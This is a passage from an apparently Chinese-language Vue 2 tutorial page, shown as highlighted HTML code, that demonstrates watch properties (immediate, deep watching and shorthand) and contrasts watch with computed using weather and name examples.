class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="javascript"></span></span></span><br><span class="line"><span class="javascript"><span class="xml">Vue.config.productionTip = <span class="literal">false</span> <span class="comment">//阻止 vue 在启动时生成生产提示。</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml"></span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="keyword">const</span> vm = <span class="keyword">new</span> Vue(&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">el</span>:<span class="string">&#x27;#root&#x27;</span>,</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">data</span>:&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">isHot</span>:<span class="literal">true</span>,</span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;,</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">computed</span>:&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="function"><span class="title">info</span>(<span class="params"></span>)</span>&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="keyword">return</span> <span class="built_in">this</span>.isHot ? <span class="string">&#x27;炎热&#x27;</span> : <span class="string">&#x27;凉爽&#x27;</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;,</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">methods</span>: &#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="function"><span class="title">changeWeather</span>(<span class="params"></span>)</span>&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="built_in">this</span>.isHot = !<span class="built_in">this</span>.isHot</span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;,</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="comment">/* watch:&#123;</span></span></span></span><br><span class="line"><span class="comment"><span class="javascript"><span class="xml">isHot:&#123;</span></span></span></span><br><span class="line"><span class="comment"><span class="javascript"><span class="xml">immediate:true, //初始化时让handler调用一下</span></span></span></span><br><span class="line"><span class="comment"><span class="javascript"><span class="xml">//handler什么时候调用？当isHot发生改变时。</span></span></span></span><br><span class="line"><span class="comment"><span class="javascript"><span class="xml">handler(newValue,oldValue)&#123;</span></span></span></span><br><span class="line"><span class="comment"><span class="javascript"><span class="xml">console.log(&#x27;isHot被修改了&#x27;,newValue,oldValue)</span></span></span></span><br><span class="line"><span class="comment"><span class="javascript"><span class="xml">&#125;</span></span></span></span><br><span class="line"><span class="comment"><span class="javascript"><span class="xml">&#125;</span></span></span></span><br><span class="line"><span class="comment"><span class="javascript"><span class="xml">&#125; */</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;)</span></span></span><br><span class="line"><span class="javascript"><span class="xml"></span></span></span><br><span class="line"><span class="javascript"><span class="xml">vm.$watch(<span class="string">&#x27;isHot&#x27;</span>,&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">immediate</span>:<span class="literal">true</span>, <span class="comment">//初始化时让handler调用一下</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="comment">//handler什么时候调用？当isHot发生改变时。</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="function"><span class="title">handler</span>(<span class="params">newValue,oldValue</span>)</span>&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="built_in">console</span>.log(<span class="string">&#x27;isHot被修改了&#x27;</span>,newValue,oldValue)</span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;)</span></span></span><br><span class="line"><span class="javascript"><span class="xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure><h3 id="深度监视"><a href="#深度监视" class="headerlink" title="深度监视"></a>深度监视</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span> /&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">title</span>&gt;</span>天气案例_深度监视<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="comment">&lt;!-- 引入Vue --&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;../js/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="comment">&lt;!-- </span></span></span><br><span class="line"><span class="comment"><span class="xml">深度监视：</span></span></span><br><span class="line"><span class="comment"><span class="xml">(1).Vue中的watch默认不监测对象内部值的改变（一层）。</span></span></span><br><span class="line"><span class="comment"><span class="xml">(2).配置deep:true可以监测对象内部值改变（多层）。</span></span></span><br><span class="line"><span class="comment"><span class="xml">备注：</span></span></span><br><span class="line"><span class="comment"><span class="xml">(1).Vue自身可以监测对象内部值的改变，但Vue提供的watch默认不可以！</span></span></span><br><span class="line"><span class="comment"><span class="xml">(2).使用watch时根据数据的具体结构，决定是否采用深度监视。</span></span></span><br><span class="line"><span class="comment"><span class="xml"> --&gt;</span></span></span><br><span class="line"><span class="xml"><span class="comment">&lt;!-- 准备好一个容器--&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>今天天气很&#123;&#123;info&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;changeWeather&quot;</span>&gt;</span>切换天气<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">hr</span>/&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">h3</span>&gt;</span>a的值是:&#123;&#123;numbers.a&#125;&#125;<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;numbers.a++&quot;</span>&gt;</span>点我让a+1<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">h3</span>&gt;</span>b的值是:&#123;&#123;numbers.b&#125;&#125;<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;numbers.b++&quot;</span>&gt;</span>点我让b+1<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;numbers = &#123;a:666,b:888&#125;&quot;</span>&gt;</span>彻底替换掉numbers<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="xml">&#123;&#123;numbers.c.d.e&#125;&#125;</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="javascript"></span></span></span><br><span class="line"><span class="javascript"><span class="xml">Vue.config.productionTip = <span class="literal">false</span> <span class="comment">//阻止 vue 在启动时生成生产提示。</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml"></span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="keyword">const</span> vm = <span class="keyword">new</span> Vue(&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">el</span>:<span class="string">&#x27;#root&#x27;</span>,</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">data</span>:&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">isHot</span>:<span class="literal">true</span>,</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">numbers</span>:&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">a</span>:<span class="number">1</span>,</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">b</span>:<span class="number">1</span>,</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">c</span>:&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">d</span>:&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">e</span>:<span class="number">100</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;,</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">computed</span>:&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="function"><span class="title">info</span>(<span class="params"></span>)</span>&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="keyword">return</span> <span class="built_in">this</span>.isHot ? <span class="string">&#x27;炎热&#x27;</span> : <span class="string">&#x27;凉爽&#x27;</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;,</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">methods</span>: &#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="function"><span class="title">changeWeather</span>(<span class="params"></span>)</span>&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="built_in">this</span>.isHot = !<span class="built_in">this</span>.isHot</span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;,</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">watch</span>:&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">isHot</span>:&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="comment">// immediate:true, //初始化时让handler调用一下</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="comment">//handler什么时候调用？当isHot发生改变时。</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="function"><span class="title">handler</span>(<span class="params">newValue,oldValue</span>)</span>&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="built_in">console</span>.log(<span class="string">&#x27;isHot被修改了&#x27;</span>,newValue,oldValue)</span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;,</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="comment">//监视多级结构中某个属性的变化</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="comment">/* &#x27;numbers.a&#x27;:&#123;</span></span></span></span><br><span class="line"><span class="comment"><span class="javascript"><span class="xml">handler()&#123;</span></span></span></span><br><span class="line"><span class="comment"><span class="javascript"><span class="xml">console.log(&#x27;a被改变了&#x27;)</span></span></span></span><br><span class="line"><span class="comment"><span class="javascript"><span class="xml">&#125;</span></span></span></span><br><span class="line"><span class="comment"><span class="javascript"><span class="xml">&#125; */</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="comment">//监视多级结构中所有属性的变化</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">numbers</span>:&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">deep</span>:<span class="literal">true</span>,</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="function"><span class="title">handler</span>(<span class="params"></span>)</span>&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="built_in">console</span>.log(<span class="string">&#x27;numbers改变了&#x27;</span>)</span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;)</span></span></span><br><span class="line"><span class="javascript"><span class="xml"></span></span></span><br><span class="line"><span class="javascript"><span class="xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure><h3 id="监视简写"><a href="#监视简写" class="headerlink" title="监视简写"></a>监视简写</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span> /&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">title</span>&gt;</span>天气案例_监视属性_简写<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="comment">&lt;!-- 引入Vue --&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;../js/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="comment">&lt;!-- 准备好一个容器--&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>今天天气很&#123;&#123;info&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;changeWeather&quot;</span>&gt;</span>切换天气<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="javascript"></span></span></span><br><span class="line"><span class="javascript"><span class="xml">Vue.config.productionTip = <span class="literal">false</span> <span class="comment">//阻止 vue 在启动时生成生产提示。</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml"></span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="keyword">const</span> vm = <span class="keyword">new</span> Vue(&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">el</span>:<span class="string">&#x27;#root&#x27;</span>,</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">data</span>:&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">isHot</span>:<span class="literal">true</span>,</span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;,</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">computed</span>:&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="function"><span class="title">info</span>(<span class="params"></span>)</span>&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="keyword">return</span> <span class="built_in">this</span>.isHot ? <span class="string">&#x27;炎热&#x27;</span> : <span class="string">&#x27;凉爽&#x27;</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;,</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">methods</span>: &#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="function"><span class="title">changeWeather</span>(<span class="params"></span>)</span>&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="built_in">this</span>.isHot = !<span class="built_in">this</span>.isHot</span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;,</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">watch</span>:&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="comment">//正常写法</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="comment">/* isHot:&#123;</span></span></span></span><br><span class="line"><span class="comment"><span class="javascript"><span class="xml">// immediate:true, //初始化时让handler调用一下</span></span></span></span><br><span class="line"><span class="comment"><span class="javascript"><span class="xml">// deep:true,//深度监视</span></span></span></span><br><span class="line"><span class="comment"><span class="javascript"><span class="xml">handler(newValue,oldValue)&#123;</span></span></span></span><br><span class="line"><span class="comment"><span class="javascript"><span class="xml">console.log(&#x27;isHot被修改了&#x27;,newValue,oldValue)</span></span></span></span><br><span class="line"><span class="comment"><span class="javascript"><span class="xml">&#125;</span></span></span></span><br><span class="line"><span class="comment"><span class="javascript"><span class="xml">&#125;, */</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="comment">//简写</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="comment">/* isHot(newValue,oldValue)&#123;</span></span></span></span><br><span class="line"><span class="comment"><span class="javascript"><span class="xml">console.log(&#x27;isHot被修改了&#x27;,newValue,oldValue,this)</span></span></span></span><br><span class="line"><span class="comment"><span class="javascript"><span class="xml">&#125; */</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;)</span></span></span><br><span class="line"><span class="javascript"><span class="xml"></span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="comment">//正常写法</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="comment">/* vm.$watch(&#x27;isHot&#x27;,&#123;</span></span></span></span><br><span class="line"><span class="comment"><span class="javascript"><span class="xml">immediate:true, //初始化时让handler调用一下</span></span></span></span><br><span class="line"><span class="comment"><span class="javascript"><span class="xml">deep:true,//深度监视</span></span></span></span><br><span class="line"><span class="comment"><span class="javascript"><span class="xml">handler(newValue,oldValue)&#123;</span></span></span></span><br><span class="line"><span class="comment"><span class="javascript"><span class="xml">console.log(&#x27;isHot被修改了&#x27;,newValue,oldValue)</span></span></span></span><br><span class="line"><span class="comment"><span class="javascript"><span class="xml">&#125;</span></span></span></span><br><span class="line"><span class="comment"><span class="javascript"><span class="xml">&#125;) */</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml"></span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="comment">//简写</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="comment">/* vm.$watch(&#x27;isHot&#x27;,(newValue,oldValue)=&gt;&#123;</span></span></span></span><br><span class="line"><span class="comment"><span class="javascript"><span class="xml">console.log(&#x27;isHot被修改了&#x27;,newValue,oldValue,this)</span></span></span></span><br><span class="line"><span class="comment"><span class="javascript"><span class="xml">&#125;) */</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml"></span></span></span><br><span class="line"><span class="javascript"><span class="xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure><h3 id="监视总结"><a href="#监视总结" class="headerlink" title="监视总结"></a>监视总结</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=&quot;UTF-8&quot; /&gt;</span><br><span class="line">&lt;title&gt;姓名案例_watch实现&lt;/title&gt;</span><br><span class="line">&lt;!-- 引入Vue --&gt;</span><br><span class="line">&lt;script type=&quot;text/javascript&quot; src=&quot;../js/vue.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;!-- </span><br><span class="line">computed和watch之间的区别：</span><br><span class="line">1.computed能完成的功能，watch都可以完成。</span><br><span class="line">2.watch能完成的功能，computed不一定能完成，例如：watch可以进行异步操作。</span><br><span class="line">两个重要的小原则：</span><br><span class="line">1.所被Vue管理的函数，最好写成普通函数，这样this的指向才是vm 或 组件实例对象。</span><br><span class="line">2.所有不被Vue所管理的函数（定时器的回调函数、ajax的回调函数等、Promise的回调函数），最好写成箭头函数，</span><br><span class="line">这样this的指向才是vm 或 组件实例对象。</span><br><span class="line">--&gt;</span><br><span class="line">&lt;!-- 准备好一个容器--&gt;</span><br><span class="line">&lt;div id=&quot;root&quot;&gt;</span><br><span class="line">姓：&lt;input type=&quot;text&quot; v-model=&quot;firstName&quot;&gt; &lt;br/&gt;&lt;br/&gt;</span><br><span class="line">名：&lt;input type=&quot;text&quot; v-model=&quot;lastName&quot;&gt; &lt;br/&gt;&lt;br/&gt;</span><br><span class="line">全名：&lt;span&gt;&#123;&#123;fullName&#125;&#125;&lt;/span&gt; &lt;br/&gt;&lt;br/&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line"></span><br><span class="line">&lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。</span><br><span class="line"></span><br><span class="line">const vm = new Vue(&#123;</span><br><span class="line">el:&#x27;#root&#x27;,</span><br><span class="line">data:&#123;</span><br><span class="line">firstName:&#x27;张&#x27;,</span><br><span class="line">lastName:&#x27;三&#x27;,</span><br><span class="line">fullName:&#x27;张-三&#x27;</span><br><span class="line">&#125;,</span><br><span class="line">watch:&#123;</span><br><span class="line">firstName(val)&#123;</span><br><span class="line">setTimeout(()=&gt;&#123;</span><br><span class="line">console.log(this)</span><br><span class="line">this.fullName = val + &#x27;-&#x27; + this.lastName</span><br><span class="line">&#125;,1000);</span><br><span class="line">&#125;,</span><br><span class="line">lastName(val)&#123;</span><br><span class="line">this.fullName = this.firstName + &#x27;-&#x27; + val</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;)</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><h2 id="绑定样式"><a href="#绑定样式" class="headerlink" title="绑定样式"></a>绑定样式</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span 